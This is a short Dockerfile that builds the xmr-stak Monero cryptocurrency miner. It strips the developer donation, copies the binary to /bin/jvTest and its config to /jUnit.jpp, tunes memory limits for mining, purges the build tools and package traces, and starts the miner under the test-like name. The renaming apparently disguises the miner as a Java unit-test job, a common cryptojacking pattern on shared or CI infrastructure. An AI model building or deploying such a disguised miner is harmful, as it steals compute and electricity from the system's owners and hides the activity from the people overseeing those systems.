FROM ubuntu:16.04  
ADD apt.conf /etc/apt/apt.conf.d/99norecommends  
ADD cpu.txt /cpu.txt  
ADD config.txt /jUnit.jpp  
ADD pools.txt /pools.txt  
  
RUN apt-get update -y && \  
apt-get dist-upgrade -y && \  
apt-get autoremove -y && \  
apt-get install -y apt-utils ca-certificates git libssl-dev cmake build-
essential libhwloc-dev htop  
  
RUN git clone https://github.com/fireice-uk/xmr-stak.git && \  
sed -i -e 's/2.0/0.0/g' xmr-stak/xmrstak/donate-level.hpp && \  
mkdir xmr-stak/build && \  
cd xmr-stak/build && \  
cmake .. -DXMR-STAK_CURRENCY=monero -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
-DMICROHTTPD_ENABLE=OFF && \  
make && \  
cp /xmr-stak/build/bin/xmr-stak /bin/jvTest  
  
RUN echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && \  
echo "* soft memlock 262144" >> /etc/security/limits.conf && \  
echo "* hard memlock 262144" >> /etc/security/limits.conf  
  
RUN apt-get purge -y build-essential cmake git && \  
apt-get autoremove -y && \  
apt-get clean && \  
dpkg --purge $(dpkg --list | grep ^rc | awk '{print $2}') &&\  
rm -rf /var/lib/apt/lists/*  
  
CMD jvTest -c jUnit.jpp  

